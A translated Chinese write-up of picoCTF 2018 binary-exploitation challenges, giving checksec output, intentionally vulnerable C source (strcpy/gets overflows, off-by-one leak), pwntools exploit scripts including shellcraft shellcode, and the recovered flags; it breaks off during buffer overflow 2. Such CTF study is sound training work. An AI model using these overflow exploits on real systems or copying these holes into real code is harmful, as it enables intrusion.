# picoCTFのpwn解析
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
## 前言
国庆期间得知了美国CMU主办的picoCTF比赛，出于最近做题的手感有所下降，借此比赛来复习下PWN相关的题型（题目的质量不错，而且题型很广，自我感觉相当棒的比赛）
###  buffer overflow 0
先检查一遍文件
    ➜  bufferoverflow0 file vuln 
    vuln: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=e1e24cdf757acbd04d095e531a40d044abed7e82, not stripped
    ➜  bufferoverflow0 checksec vuln 
    [*] '/home/Ep3ius/pwn/process/picoCTF2018/bufferoverflow0/vuln'
        Arch:     i386-32-little
        RELRO:    Partial RELRO
        Stack:    No canary found
        NX:       NX enabled
        PIE:      No PIE (0x8048000)
由于这题给了源码所以我们直接看源码
    #include 
    #include 
    #include 
    #include 
    #define FLAGSIZE_MAX 64
    char flag[FLAGSIZE_MAX];
    void sigsegv_handler(int sig) {
      fprintf(stderr, "%sn", flag);
      fflush(stderr);
      exit(1);
    }
    void vuln(char *input){
      char buf[16];
      strcpy(buf, input);// !stackoverflow
    }
    int main(int argc, char **argv){
      FILE *f = fopen("flag.txt","r");
      if (f == NULL) {
        printf("Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.n");
        exit(0);
      }
      fgets(flag,FLAGSIZE_MAX,f);
      signal(SIGSEGV, sigsegv_handler);
      gid_t gid = getegid();
      setresgid(gid, gid, gid);
      if (argc > 1) {
        vuln(argv[1]);
        printf("Thanks! Received: %s", argv[1]);
      }
      else
        printf("This program takes 1 argument.n");
      return 0;
    }
不难看出传入的参数没有限制大小造成在vuln函数里面strcpy至buf时可能导致栈溢出，而这题只要将程序执行流劫持到sigsegv_handler函数就可以读flag，直接放exp
**EXP**
    from pwn import*
    context(os='linux',arch='i386',log_level='debug')
    elf = ELF('./vuln')
    flag_addr = 0x804a080
    puts_plt = elf.plt['puts']
    buf = 'a'*0x18
    payload  = buf + 'aaaa'
    payload += p32(puts_plt) + 'aaaa' + p32(flag_addr)
    n = process(argv=['./vuln', payload])
    n.interactive()
**FLAG**
    picoCTF{ov3rfl0ws_ar3nt_that_bad_a54b012c}
###  buffer overflow 1
检查一遍文件
    ➜  bufferoverflow1 file vuln 
    vuln: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=98eac1e5bfaa95437b28e069a343f3c3a7b9e800, not stripped
    ➜  bufferoverflow1 checksec vuln 
    [*] '/home/Ep3ius/pwn/process/picoCTF2018/bufferoverflow1/vuln'
        Arch:     i386-32-little
        RELRO:    Partial RELRO
        Stack:    No canary found
        NX:       NX disabled
        PIE:      No PIE (0x8048000)
        RWX:      Has RWX segments
全都没开，大胆猜测是要我们写shellcode，看源码确认一波
    #include 
    #include 
    #include 
    #include 
    #include 
    #include "asm.h"
    #define BUFSIZE 32
    #define FLAGSIZE 64
    void win() {
      char buf[FLAGSIZE];
      FILE *f = fopen("flag.txt","r");
      if (f == NULL) {
        printf("Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.n");
        exit(0);
      }
      fgets(buf,FLAGSIZE,f);
      printf(buf);
    }
    void vuln(){
      char buf[BUFSIZE];
      gets(buf);
      printf("Okay, time to return... Fingers Crossed... Jumping to 0x%xn", get_return_address());
    }
    int main(int argc, char **argv){
      setvbuf(stdout, NULL, _IONBF, 0);
      gid_t gid = getegid();
      setresgid(gid, gid, gid);
      puts("Please enter your string: ");
      vuln();
      return 0;
    }
emmmm……看起来是可以用ret2shellcode但感觉有点麻烦，所以就简单套路直接溢出后劫持返回地址为win函数直接getflag
**EXP**
    from pwn import*
    context(os='linux',arch='i386',log_level='debug')
    n = process('./vuln')
    elf = ELF('./vuln')
    buf = 0x28
    win_addr = 0x080485CB
    payload = 'a'*buf + 'aaaa' + p32(win_addr)
    n.sendline(payload)
    n.interactive()
**FLAG**
    picoCTF{addr3ss3s_ar3_3asy14941911}
###  leak-me
    ➜  leak-me file auth 
    auth: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=c69a8024075d10a44fe028c410f5a06580bd3d82, not stripped
    ➜  leak-me checksec auth 
    [*] '/home/Ep3ius/pwn/process/picoCTF2018/leak-me/auth'
        Arch:     i386-32-little
        RELRO:    Partial RELRO
        Stack:    No canary found
        NX:       NX enabled
        PIE:      No PIE (0x8048000)
看源码分析一下程序的主要功能
    #include 
    #include 
    #include 
    #include 
    #include 
    int flag() {
      char flag[48];
      FILE *file;
      file = fopen("flag.txt", "r");
      if (file == NULL) {
        printf("Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.n");
        exit(0);
      }
      fgets(flag, sizeof(flag), file);
      printf("%s", flag);
      return 0;
    }
    int main(int argc, char **argv){
      setvbuf(stdout, NULL, _IONBF, 0);
      // Set the gid to the effective gid
      gid_t gid = getegid();
      setresgid(gid, gid, gid);
      // real pw: 
      FILE *file;
      char password[64];
      char name[256];
      char password_input[64];
      memset(password, 0, sizeof(password));
      memset(name, 0, sizeof(name));
      memset(password_input, 0, sizeof(password_input));
      printf("What is your name?n");
      fgets(name, sizeof(name), stdin);
      char *end = strchr(name, 'n');    //name='a'*0x100  *end = NULL
      if (end != NULL) 
      {
        *end = 'x00';
      }
      strcat(name, ",nPlease Enter the Password.");
      file = fopen("password.txt", "r");
      if (file == NULL) 
      {
        printf("Password File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.n");
        exit(0);
      }
      fgets(password, sizeof(password), file);
      printf("Hello ");
      puts(name);
      fgets(password_input, sizeof(password_input), stdin);
      password_input[sizeof(password_input)] = 'x00';
      if (!strcmp(password_input, password)) 
      {
        flag();
      }
      else 
      {
        printf("Incorrect Password!n");
      }
      return 0;
    }
我们可以看到存在一个很经典的栅栏错误类型的off-by-one漏洞，当name输入为‘a’*0x100 时栈上的结构会如下图所示
我们知道puts是根据’x00’来判断字符串的末端来输出，根据程序逻辑正常的情况下应该是像左图一样是以’n’为结尾的字符串，然后通过源代码43—47行来将’n’替换成’x00’使得puts(name)能正确输出输入的name，但如果输入了’a’*256的话，会导致最后一个’n’并没有读入而导致程序在puts(name)时会连带下面的password一起输出，这样我们就可以得到服务器上的password为
    a_reAllY_s3cuRe_p4s$word_f85406
然后直接连服务器，输入长度小于256的name和leak出来的password就能直接拿到flag
**FLAG**
    picoCTF{aLw4y5_Ch3cK_tHe_bUfF3r_s1z3_0f7ec3c0}
###  shellcode
    ➜  shellcode file vuln 
    vuln: ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), statically linked, for GNU/Linux 2.6.32, BuildID[sha1]=fdba7cd36e043609da623c330a501f920470b49a, not stripped
    ➜  shellcode checksec vuln 
    [*] '/home/Ep3ius/pwn/process/picoCTF2018/shellcode/vuln'
        Arch:     i386-32-little
        RELRO:    Partial RELRO
        Stack:    No canary found
        NX:       NX disabled
        PIE:      No PIE (0x8048000)
        RWX:      Has RWX segments
emmmm……防护机制全没开而且题目还叫shellcode，应该错不了是写shellcode了
    #include 
    #include 
    #include 
    #include 
    #include 
    #define BUFSIZE 148
    #define FLAGSIZE 128
    void vuln(char *buf){
      gets(buf);
      puts(buf);
    }
    int main(int argc, char **argv){
      setvbuf(stdout, NULL, _IONBF, 0);
      // Set the gid to the effective gid
      // this prevents /bin/sh from dropping the privileges
      gid_t gid = getegid();
      setresgid(gid, gid, gid);
      char buf[BUFSIZE];
      puts("Enter a string!");
      vuln(buf);
      puts("Thanks! Executing now...");
      ((void (*)())buf)();
      return 0;
    }
简单审计源码后发现还真是只要写个shellcode就没了，直接给exp
EXP
    from pwn import*
    context(os='linux',arch='i386',log_level='debug')
    n = process('./vuln')
    elf = ELF('./vuln')
    payload = asm(shellcraft.sh())
    n.sendline(payload)
    n.interactive()
FLAG
    picoCTF{shellc0de_w00h00_7f5a7309}
###  bufer overflow2
    ➜  bufferoverflow2 file vuln 
    vuln: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=f2f6cce698b62f5109de9955c0ea0ab832ea967c, not stripped
    ➜  bufferoverflow2 checksec vuln 
    [*] '/home/Ep3ius/pwn/process/picoCTF2018/bufferoverflow2/vuln'
        Arch:     i386-32-little
        RELRO:    Partial RELRO
        Stack:    No canary found
        NX:       NX enabled
        PIE:      No PIE (0x8048000)
审计一下源码
    #include 
    #include 
    #include 
    #include 
    #include 
    #define BUFSIZE 100
    #define FLAGSIZE 64
    void win(unsigned int arg1, unsigned int arg2) {
      char buf[FLAGSIZE];
      FILE *f = fopen("flag.txt","r");
      if (f == NULL) {
        printf("Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.n");
        exit(0);
      }